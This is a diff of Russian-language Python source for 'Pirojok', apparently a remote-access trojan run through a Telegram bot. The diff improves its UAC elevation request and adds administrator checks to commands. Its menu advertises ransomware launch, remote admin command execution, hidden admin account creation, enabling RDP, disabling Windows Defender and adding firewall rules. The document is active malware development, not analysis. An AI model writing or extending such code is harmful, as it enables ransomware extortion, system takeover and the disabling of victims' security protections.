@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Пирожок - идеально прожаренное блюдо для удаленного управления
-Версия 5.3.1 - ИСПРАВЛЕННАЯ (menu и help работают)
+Версия 5.3.2 - ИСПРАВЛЕННЫЙ ЗАПРОС ПРАВ АДМИНИСТРАТОРА
 """
 
 import os
@@ -413,7 +413,7 @@ class Pirojok:
         self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
         self.running = True
         self.processes = []
-        self.version = "5.3.1"
+        self.version = "5.3.2"
         self.command_timeout = 60
         self.admin_mode = self.check_admin()
         self.startup_time = datetime.now()
@@ -542,9 +542,12 @@ class Pirojok:
         except:
             return False
     
+    # ========== ИСПРАВЛЕННЫЙ МЕТОД ЗАПРОСА ПРАВ ==========
+    
     def request_admin(self):
-        """Запрос прав администратора"""
+        """Запрос прав администратора - ИСПРАВЛЕННАЯ ВЕРСИЯ"""
         try:
+            # Сначала проверяем, есть ли уже права
             if self.check_admin():
                 self.admin_mode = True
                 return "👑 Уже есть права администратора!"
@@ -552,6 +555,7 @@ class Pirojok:
             if platform.system() != "Windows":
                 return "❌ Запрос прав только для Windows"
             
+            # Определяем путь к исполняемому файлу
             if getattr(sys, 'frozen', False):
                 executable = sys.executable
                 params = ' '.join(sys.argv[1:])
@@ -559,14 +563,36 @@ class Pirojok:
                 executable = sys.executable
                 params = ' '.join([sys.argv[0]] + sys.argv[1:])
             
+            # Показываем UAC диалог
+            self.send_message(self.owner_id, "👑 Запрашиваю права администратора... Подтвердите в UAC")
+            
+            # ShellExecuteW с параметром "runas" вызывает UAC
             result = ctypes.windll.shell32.ShellExecuteW(
-                None, "runas", executable, params, None, 1
+                None,          # Окно-владелец
+                "runas",       # Операция - запуск от админа
+                executable,    # Что запускаем
+                params,        # Параметры
+                None,          # Рабочая папка
+                1              # Показать окно нормально
             )
             
+            # Проверяем результат (32 и выше - успех)
             if result > 32:
-                return "👑 Запрашиваю права администратора... Перезапуск"
+                # Не завершаем процесс сразу, даем время на запуск нового
+                self.send_message(self.owner_id, "👑 UAC диалог открыт. Жду подтверждения...")
+                
+                # Ждем 3 секунды и проверяем права
+                time.sleep(3)
+                
+                # Проверяем, появились ли права
+                if self.check_admin():
+                    self.admin_mode = True
+                    return "👑 Права администратора получены!"
+                else:
+                    # Если прав нет, возможно пользователь отклонил
+                    return "👑 Возможно, вы отклонили запрос. Попробуйте еще раз или проверьте admin_check"
             else:
-                return "❌ Не удалось получить права администратора"
+                return f"❌ Не удалось получить права администратора (код: {result})"
                 
         except Exception as e:
             return f"❌ Ошибка запроса прав: {e}"
@@ -1126,7 +1152,7 @@ class Pirojok:
             if clean_text == "help" or clean_text == "menu":
                 print("📋 ОТПРАВЛЯЮ МЕНЮ")
                 help_text = """
-🥷 <b>ПИРОЖОК V5.3.1 - ИСПРАВЛЕННЫЙ</b>
+🥷 <b>ПИРОЖОК V5.3.2 - ИСПРАВЛЕННЫЙ</b>
 
 <b>🔒 RANSOMWARE:</b>
 • ransom / ransom_start - ЗАПУСТИТЬ ВЫМОГАТЕЛЯ!
@@ -1140,6 +1166,7 @@ class Pirojok:
 <b>⚡ МОМЕНТАЛЬНО:</b>
 • shutdown_now - выключить сейчас
 • reboot_now - перезагрузить сейчас
+• shutdown_emergency - аварийно
 
 <b>👑 АДМИН-КОМАНДЫ:</b>
 • admin - запросить права админа
@@ -1222,6 +1249,9 @@ class Pirojok:
             
             # === RANSOM START ===
             if clean_text == "ransom" or clean_text == "ransom_start":
+                if not self.admin_mode:
+                    self.send_message(chat_id, "👑 Для ransomware нужны права администратора")
+                    return
                 result = self.ransomware_start()
                 self.send_message(chat_id, result)
                 self.mark_command_processed(update_id, text)
@@ -1300,6 +1330,9 @@ class Pirojok:
             
             # === ADMIN CMD ===
             if clean_text.startswith("admin_cmd"):
+                if not self.admin_mode:
+                    self.send_message(chat_id, "👑 Нужны права администратора")
+                    return
                 cmd = text[9:].strip()
                 if cmd:
                     result = self.run_as_admin_command(cmd)
@@ -1311,6 +1344,9 @@ class Pirojok:
             
             # === CREATE USER ===
             if clean_text.startswith("create_user"):
+                if not self.admin_mode:
+                    self.send_message(chat_id, "👑 Нужны права администратора")
+                    return
                 parts = text.split()
                 if len(parts) == 3:
                     result = self.create_admin_user(parts[1], parts[2])
@@ -1322,6 +1358,9 @@ class Pirojok:
             
             # === ENABLE RDP ===
             if clean_text == "enable_rdp":
+                if not self.admin_mode:
+                    self.send_message(chat_id, "👑 Нужны права администратора")
+                    return
                 result = self.enable_rdp()
                 self.send_message(chat_id, result)
                 self.mark_command_processed(update_id, text)
@@ -1329,6 +1368,9 @@ class Pirojok:
             
             # === DISABLE DEFENDER ===
             if clean_text == "disable_defender":
+                if not self.admin_mode:
+                    self.send_message(chat_id, "👑 Нужны права администратора")
+                    return
                 result = self.disable_defender()
                 self.send_message(chat_id, result)
                 self.mark_command_processed(update_id, text)
@@ -1336,6 +1378,9 @@ class Pirojok:
             
             # === ADD RULE ===
             if clean_text.startswith("add_rule"):
+                if not self.admin_mode:
+                    self.send_message(chat_id, "👑 Нужны права администратора")
+                    return
                 parts = text.split()
                 if len(parts) >= 2:
                     port = parts[1]
